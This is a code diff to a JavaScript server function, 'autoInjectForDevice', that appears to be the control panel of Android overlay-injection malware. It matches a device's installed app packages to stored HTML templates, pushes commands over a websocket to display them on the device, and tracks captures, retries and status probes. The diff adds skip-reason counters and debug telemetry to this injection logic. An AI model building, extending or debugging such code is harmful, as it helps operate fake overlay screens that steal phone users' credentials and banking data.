+        installedAppCount: Array.isArray(apps) ? apps.length : 0,
+        enabledTemplateCount: 0,
+        matchedTemplateCount: 0,
+        injectedCount: 0,
+        skippedByReason: { 'no-enabled-templates': 1 },
+        durationMs: Date.now() - matchingStartedAt,
+      });
+      return;
+    }
 
     // 构建设备已安装应用包名集合，同时保留安装时间用于识别“卸载后重装”。
     const installedAppsByPackage = new Map();
@@ -1543,6 +1935,7 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
       if (packageName) installedAppsByPackage.set(packageName, app);
     }
     const installedPkgs = new Set(installedAppsByPackage.keys());
+    const matchedTemplateCount = templates.filter(tpl => tpl.package_name && installedPkgs.has(tpl.package_name)).length;
 
     // 获取该设备已注入记录
     if (!autoInjectedCache.has(deviceId)) autoInjectedCache.set(deviceId, new Set());
@@ -1637,6 +2030,7 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
     let injectedCount = 0;
     const injectedPackages = [];
     const injectedTemplateIds = [];
+    const skippedByReason = {};
     for (const tpl of templates) {
       const pkg = tpl.package_name;
       if (!pkg || !installedPkgs.has(pkg)) continue;
@@ -1649,6 +2043,7 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
               ? 'concurrent-reservation'
               : 'client-confirmed-cache';
         console.log(`[WS-Device] Skip auto-inject ${pkg} for ${deviceId} (${skipReason})`);
+        skippedByReason[skipReason] = Number(skippedByReason[skipReason] || 0) + 1;
         void recordDeviceDebug('injection.auto.skipped', deviceId, {
           packageName: pkg,
           templateId: tpl.template_id,
@@ -1672,7 +2067,15 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
           [tpl.template_id]
         );
         const htmlContent = rows?.[0]?.html_content;
-        if (!htmlContent) continue;
+        if (!htmlContent) {
+          skippedByReason['template-html-missing'] = Number(skippedByReason['template-html-missing'] || 0) + 1;
+          void recordDeviceDebug('injection.auto.skipped', deviceId, {
+            packageName: pkg,
+            templateId: tpl.template_id,
+            reason: 'template-html-missing',
+          }, 'warn');
+          continue;
+        }
 
         // 先登记活跃任务再下发。这样 APK 即使毫秒级确认，控制台
         // 也不会在“发送成功”和“DB 写入”的空窗期显示错误状态。
@@ -1708,7 +2111,7 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
             throw taskErr;
           }
 
-          ws.send(JSON.stringify({
+          const showPayload = JSON.stringify({
             type: 'command',
             sessionId: deviceId,
             data: {
@@ -1721,7 +2124,8 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
                 source: 'auto'
               }
             }
-          }));
+          });
+          ws.send(showPayload);
           sent = true;
           injectedCount++;
           injectedPackages.push(pkg);
@@ -1733,8 +2137,15 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
             templateId: tpl.template_id,
             templateName: tpl.name || '',
             requestId,
-            htmlBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
+            source: 'auto',
+            templateContentBytes: Buffer.byteLength(String(htmlContent), 'utf8'),
+            payloadBytes: Buffer.byteLength(showPayload, 'utf8'),
             taskPersisted,
+            connectionAgeMs: Math.max(
+              0,
+              Date.now() - Number(connections.devices.get(deviceId)?.connectedAt || Date.now())
+            ),
+            wsReadyState: ws.readyState,
           });
           scheduleInjectionStatusProbes(ws, deviceId, pkg, requestId);
           scheduleAutoInjectionRetry({
@@ -1750,6 +2161,7 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
           });
         }
       } catch (sendErr) {
+        skippedByReason['send-error'] = Number(skippedByReason['send-error'] || 0) + 1;
         if (taskPersisted && !sent) {
           try {
             await db.query(
@@ -1781,8 +2193,27 @@ async function autoInjectForDevice(deviceId, apps, ws, connections) {
         templateIds: injectedTemplateIds
       });
     }
+    void recordDeviceDebug('injection.auto.match_summary', deviceId, {
+      installedAppCount: installedPkgs.size,
+      enabledTemplateCount: templates.length,
+      matchedTemplateCount,
+      persistedActiveCount: persistedActive.size,
+      completedCaptureCount: completedCaptures.size,
+      reservedCount: reservations.size,
+      injectedCount,
+      injectedPackages,
+      injectedTemplateIds,
+      skippedByReason,
+      durationMs: Date.now() - matchingStartedAt,
+    });
   } catch (err) {
     console.error('[WS-Device] autoInjectForDevice error:', err.message);
+    void recordDeviceDebug('injection.auto.match_summary', deviceId, {
+      installedAppCount: Array.isArray(apps) ? apps.length : 0,
+      outcome: 'error',
+      message: err.message || String(err),
+      durationMs: Date.now() - matchingStartedAt,
+    }, 'error');
   }
 }
 
